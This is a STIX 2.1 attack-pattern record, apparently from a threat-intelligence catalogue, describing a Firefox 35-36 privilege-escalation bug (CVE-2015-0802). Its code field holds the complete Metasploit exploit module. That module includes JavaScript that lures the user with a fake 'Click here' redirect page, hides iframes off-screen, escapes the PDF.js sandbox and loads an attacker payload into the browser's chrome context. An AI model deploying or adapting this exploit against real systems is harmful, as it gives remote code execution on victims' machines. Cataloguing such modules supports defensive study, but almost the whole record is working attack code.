{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ac0a67eb-9a59-4cb9-b870-f0ca8fef902b",
    "created": "2024-08-14T17:06:22.103885Z",
    "modified": "2024-08-14T17:06:22.103889Z",
    "name": "Firefox PDF.js Privileged Javascript Injection",
    "description": " This module gains remote code execution on Firefox 35-36 by abusing a privilege escalation bug in resource:// URIs. PDF.js is used to exploit the bug. This exploit requires the user to click anywhere on the page to trigger the vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/firefox_pdfjs_privilege_escalation.rb",
            "external_id": "firefox_pdfjs_privilege_escalation.rb"
        },
        {
            "source_name": "joev#copypastamonkey",
            "external_id": "CVE-2015-0802"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0802#canaccessmessageManagerpropertyinchromewindow"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => 'Firefox PDF.js Privileged Javascript Injection',\n      'Description' => %q{\n        This module gains remote code execution on Firefox 35-36 by abusing a\n        privilege escalation bug in resource:// URIs. PDF.js is used to exploit\n        the bug. This exploit requires the user to click anywhere on the page to\n        trigger the vulnerability.\n      },\n      'Author'         => [\n        'Unknown', # PDF.js injection code was taken from a 0day\n        'Marius Mlynski', # discovery and pwn2own exploit\n        'joev'     # copypasta monkey, CVE-2015-0802\n      ],\n      'DisclosureDate' => '2015-03-31',\n      'License'     => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2015-0816'], # pdf.js can load chrome://\n          ['CVE', '2015-0802']  # can access messageManager property in chrome window\n        ],\n      'Targets' => [\n        [\n          'Universal (Javascript XPCOM Shell)', {\n            'Platform' => 'firefox',\n            'Arch' => ARCH_FIREFOX\n          }\n        ],\n        [\n          'Native Payload', {\n            'Platform' => %w{ java linux osx solaris win },\n            'Arch'     => ARCH_ALL\n          }\n        ]\n      ],\n      'DefaultTarget' => 0,\n      'BrowserRequirements' => {\n        :source  => 'script',\n        :ua_name => HttpClients::FF,\n        :ua_ver  => lambda { |ver| ver.to_i.between?(35, 36) }\n      }\n    ))\n\n    register_options([\n      OptString.new('CONTENT', [ false, \"Content to display inside the HTML <body>.\" ])\n    ])\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status('Sending exploit...')\n    send_response_html(cli, html)\n  end\n\n  def html\n    \"<!doctype html><html><body>#{datastore['CONTENT'] || default_html}\"+\n    \"<script>#{js}</script></body></html>\"\n  end\n\n  def default_html\n    \"The page has moved. <span style='text-decoration:underline;'>Click here</span> to be redirected.\"\n  end\n\n  def js\n    key = Rex::Text.rand_text_alpha(5 + rand(12))\n    frame = Rex::Text.rand_text_alpha(5 + rand(12))\n    r = Rex::Text.rand_text_alpha(5 + rand(12))\n    opts = { key => run_payload } # defined in FirefoxPrivilegeEscalation mixin\n\n    <<-EOJS\nfunction xml2string(obj) {\n  return new XMLSerializer().serializeToString(obj);\n}\n\nfunction __proto(obj) {\n  return obj.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__;\n}\n\nfunction get(path, callback, timeout, template, value) {\n  callback = _(callback);\n  if (template && value) {\n    callback = callback.replace(template, value);\n  }\n  js_call1 = 'javascript:' + _(function() {\n    try {\n      done = false;\n      window.onclick = function() {\n        if (done) { return; } done = true;\n        q = open(\"%url%\", \"q\", \"chrome,,top=-9999px,left=-9999px,height=1px,width=1px\");\n        setTimeout(function(){\n          q.location='data:text/html,<iframe mozbrowser src=\"about:blank\"></iframe>';\n\n            setTimeout(function(){\n              var opts = #{JSON.unparse(opts)};\n              var key = opts['#{key}'];\n              q.messageManager.loadFrameScript('data:,'+key, false);\n              setTimeout(function(){\n                q.close();\n              }, 100)\n            }, 100)\n        }, 100);\n      }\n    } catch (e) {\n      history.back();\n    }\n    undefined;\n  }, \"%url%\", path);\n  js_call2 = 'javascript:;try{updateHidden();}catch(e){};' + callback + ';undefined';\n  sandboxContext(_(function() {\n    p = __proto(i.contentDocument.styleSheets[0].ownerNode);\n    l = p.__lookupSetter__.call(i2.contentWindow, 'location');\n    l.call(i2.contentWindow, window.wrappedJSObject.js_call1);\n  }));\n  setTimeout((function() {\n    sandboxContext(_(function() {\n      p = __proto(i.contentDocument.styleSheets[0].ownerNode);\n      l = p.__lookupSetter__.call(i2.contentWindow, 'location');\n      l.call(i2.contentWindow, window.wrappedJSObject.js_call2);\n    }));\n  }), timeout);\n}\n\nfunction get_data(obj) {\n  data = null;\n  try {\n    data = obj.document.documentElement.innerHTML;\n    if (data.indexOf('dirListing') < 0) {\n      throw new Error();\n    }\n  } catch (e) {\n    if (this.document instanceof XMLDocument) {\n        data = xml2string(this.document);\n    } else {\n      try {\n          if (this.document.body.firstChild.nodeName.toUpperCase() == 'PRE') {\n              data = this.document.body.firstChild.textContent;\n          } else {\n              throw new Error();\n          }\n      } catch (e) {\n        try {\n          if (this.document.body.baseURI.indexOf('pdf.js') >= 0 || data.indexOf('aboutNetError') > -1) {;\n              return null;\n          } else {\n              throw new Error();\n          }\n        } catch (e) {\n          ;;\n        }\n      }\n    }\n  }\n  return data;\n}\n\nfunction _(s, template, value) {\n  s = s.toString().split(/^\\\\s*function\\\\s+\\\\(\\\\s*\\\\)\\\\s*\\\\{/)[1];\n  s = s.substring(0, s.length - 1);\n  if (template && value) {\n    s = s.replace(template, value);\n  }\n  s += __proto;\n  s += xml2string;\n  s += get_data;\n  s = s.replace(/\\\\s\\\\/\\\\/.*\\\\n/g, \"\");\n  s = s + \";undefined\";\n  return s;\n}\n\nfunction get_sandbox_context() {\n  if (window.my_win_id == null) {\n    for (var i = 0; i < 20; i++) {\n      try {\n        if (window[i].location.toString().indexOf(\"view-source:\") != -1) {\n          my_win_id = i;\n          break;\n        }\n      } catch (e) {}\n    }\n  };\n  if (window.my_win_id == null)\n    return;\n  clearInterval(sandbox_context_i);\n  object.data = 'view-source:' + blobURL;\n  window[my_win_id].location = 'data:application/x-moz-playpreview-pdfjs;,';\n  object.data = 'data:text/html,<'+'html/>';\n  window[my_win_id].frameElement.insertAdjacentHTML('beforebegin', '<iframe style='+\n    '\"position:absolute; left:-9999px;\" onload = \"'+_(function(){\n    window.wrappedJSObject.sandboxContext=(function(cmd) {\n      with(importFunction.constructor('return this')()) {\n        return eval(cmd);\n      }\n    });\n  }) + '\"/>');\n}\n\nvar HIDDEN = 'position:absolute;left:-9999px;height:1px;width:1px;';\nvar i = document.createElement(\"iframe\");\ni.id = \"i\";\ni.style=HIDDEN;\ni.src = \"data:application/xml,<?xml version=\\\\\"1.0\\\\\"?><e><e1></e1></e>\";\ndocument.documentElement.appendChild(i);\ni.onload = function() {\n  if (this.contentDocument.styleSheets.length > 0) {\n    var i2 = document.createElement(\"iframe\");\n    i2.id = \"i2\";\n    i2.style='opacity: 0;position:absolute;top:0;left:0;right:0;bottom:0;';\n    i2.height = window.innerHeight+'px';\n    i2.width = window.innerWidth+'px';\n    i2.src = \"data:application/pdf,\";\n    document.documentElement.appendChild(i2);\n    pdfBlob = new Blob([''], {\n        type: 'application/pdf'\n    });\n    blobURL = URL.createObjectURL(pdfBlob);\n    object = document.createElement('object');\n    object.style=HIDDEN;\n    object.data = 'data:application/pdf,';\n    object.onload = (function() {\n        sandbox_context_i = setInterval(get_sandbox_context, 200);\n        object.onload = null;\n        object.data = 'view-source:' + location.href;\n        return;\n    });\n    document.documentElement.appendChild(object);\n  } else {\n    this.contentWindow.location.reload();\n  }\n}\n\ndocument.body.style.height = window.innerHeight+'px';\n\nvar kill = setInterval(function() {\n  if (window.sandboxContext) {\n    var f = \"chrome://browser/content/browser.xul\";\n    get(f, function() {}, 0, \"%URL%\", f);\n    clearInterval(kill);\n  } else {\n    return;\n  }\n},20);\n\nEOJS\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-31",
    "x_mitre_platforms": [
        "%w{ java linux osx solaris win }"
    ]
}